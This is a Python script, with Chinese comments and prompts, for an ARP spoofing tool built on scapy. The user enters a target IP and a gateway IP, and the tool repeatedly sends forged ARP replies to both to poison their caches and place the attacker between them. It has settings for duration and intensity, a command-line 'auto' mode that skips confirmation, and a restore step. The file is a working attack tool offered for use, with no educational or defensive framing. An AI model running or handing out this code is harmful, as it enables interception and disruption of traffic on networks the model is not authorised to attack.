#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简单ARP欺骗工具 - 自定义配置版本
支持自定义配置和Y/N确认执行
支持命令行参数模式
"""

import time
import threading
import argparse
import sys
from scapy.all import *

class SimpleARPSpoof:
    def __init__(self):
        self.is_running = False
        self.target_ip = ""
        self.gateway_ip = ""
        
        # 统计信息
        self.stats = {
            'arp_packets_sent': 0,
            'start_time': None
        }
    
    def get_configuration(self):
        """获取用户自定义配置"""
        print("=" * 60)
        print("          ARP欺骗工具 - 自定义配置")
        print("=" * 60)
        
        # 目标IP配置
        while True:
            target_ip = input("请输入目标IP地址 (例如: 192.168.1.100): ").strip()
            if self.validate_ip(target_ip):
                self.target_ip = target_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 网关IP配置
        while True:
            gateway_ip = input("请输入网关IP地址 (例如: 192.168.1.1): ").strip()
            if self.validate_ip(gateway_ip):
                self.gateway_ip = gateway_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 攻击时长配置
        while True:
            try:
                duration = int(input("请输入攻击时长(秒) (默认300): ").strip() or "300")
                if duration > 0:
                    self.attack_duration = duration
                    break
                else:
                    print("❌ 时长必须大于0")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 攻击强度配置
        attack_intensity = input("请输入攻击强度(low/medium/high) (默认medium): ").strip().lower()
        if attack_intensity not in ['low', 'medium', 'high']:
            attack_intensity = 'medium'
        self.attack_intensity = attack_intensity
        
        return self.show_configuration()
    
    def validate_ip(self, ip):
        """验证IP地址格式"""
        import re
        pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return re.match(pattern, ip) is not None
    
    def show_configuration(self):
        """显示配置信息并请求确认"""
        print("\n" + "=" * 60)
        print("          配置确认")
        print("=" * 60)
        print(f"目标IP: {self.target_ip}")
        print(f"网关IP: {self.gateway_ip}")
        print(f"攻击时长: {self.attack_duration}秒")
        print(f"攻击强度: {self.attack_intensity}")
        print("=" * 60)
        
        # 请求用户确认
        while True:
            confirm = input("\n确认执行攻击? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_spoof(self):
        """开始ARP欺骗攻击"""
        print("=" * 60)
        print("          ARP欺骗攻击开始")
        print("=" * 60)
        print(f"目标IP: {self.target_ip}")
        print(f"网关IP: {self.gateway_ip}")
        print(f"攻击时长: {self.attack_duration}秒")
        print(f"攻击强度: {self.attack_intensity}")
        print("=" * 60)
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        self.stats['arp_packets_sent'] = 0
        
        # 根据攻击强度调整发送频率
        intensity_map = {'low': 2, 'medium': 1, 'high': 0.5}
        interval = intensity_map.get(self.attack_intensity, 1)
        
        # 启动ARP欺骗
        try:
            self.arp_spoof_worker(interval)
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
        except Exception as e:
            print(f"[-] ARP欺骗错误: {e}")
        finally:
            self.stop_attack()
    
    def arp_spoof_worker(self, interval):
        """ARP欺骗工作线程"""
        print("[+] 开始发送ARP欺骗包...")
        
        end_time = time.time() + self.attack_duration
        
        while self.is_running and time.time() < end_time:
            try:
                # 发送ARP欺骗包给目标
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip), verbose=0)
                
                # 发送ARP欺骗包给网关
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip), verbose=0)
                
                self.stats['arp_packets_sent'] += 2
                
                # 显示进度
                elapsed = time.time() - self.stats['start_time']
                if int(elapsed) % 5 == 0:
                    print(f"[+] 已发送 {self.stats['arp_packets_sent']} 个ARP包，运行时间: {int(elapsed)}秒")
                
                time.sleep(interval)
                
            except Exception as e:
                print(f"[-] 发送ARP包失败: {e}")
                time.sleep(1)
    
    def stop_attack(self):
        """停止攻击并恢复网络"""
        if self.is_running:
            print("\n[+] 停止攻击，恢复网络...")
            
            try:
                # 发送恢复ARP包
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
                print("[+] 网络恢复完成")
            except Exception as e:
                print(f"[-] 恢复网络失败: {e}")
            
            self.is_running = False
            
            # 显示统计信息
            elapsed = time.time() - self.stats['start_time']
            print(f"\n[+] 攻击统计:")
            print(f"    - 总运行时间: {int(elapsed)}秒")
            print(f"    - 发送ARP包数: {self.stats['arp_packets_sent']}")
            print(f"    - 平均速率: {self.stats['arp_packets_sent'] / elapsed:.2f} 包/秒")

def auto_execute(target_ip, gateway_ip, duration=300, intensity="medium"):
    """自动执行模式 - 无需交互式输入"""
    spoof = SimpleARPSpoof()
    spoof.target_ip = target_ip
    spoof.gateway_ip = gateway_ip
    spoof.attack_duration = duration
    spoof.attack_intensity = intensity
    
    print("=" * 60)
    print("          ARP欺骗工具 - 自动模式")
    print("=" * 60)
    print(f"目标IP: {target_ip}")
    print(f"网关IP: {gateway_ip}")
    print(f"攻击时长: {duration}秒")
    print(f"攻击强度: {intensity}")
    print("=" * 60)
    
    spoof.start_spoof()

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="简单ARP欺骗工具")
    parser.add_argument("--target", help="目标IP地址")
    parser.add_argument("--gateway", help="网关IP地址")
    parser.add_argument("--duration", type=int, default=300, help="攻击时长(秒)")
    parser.add_argument("--intensity", choices=['low', 'medium', 'high'], default='medium', help="攻击强度")
    parser.add_argument("--auto", action="store_true", help="自动模式(无需确认)")
    
    args = parser.parse_args()
    
    try:
        # 检查是否使用命令行参数模式
        if args.target and args.gateway:
            # 命令行参数模式
            if args.auto:
                # 自动模式 - 直接执行
                auto_execute(args.target, args.gateway, args.duration, args.intensity)
            else:
                # 交互式确认模式
                spoof = SimpleARPSpoof()
                spoof.target_ip = args.target
                spoof.gateway_ip = args.gateway
                spoof.attack_duration = args.duration
                spoof.attack_intensity = args.intensity
                
                if spoof.show_configuration():
                    spoof.start_spoof()
        else:
            # 传统交互式模式
            spoof = SimpleARPSpoof()
            if spoof.get_configuration():
                spoof.start_spoof()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()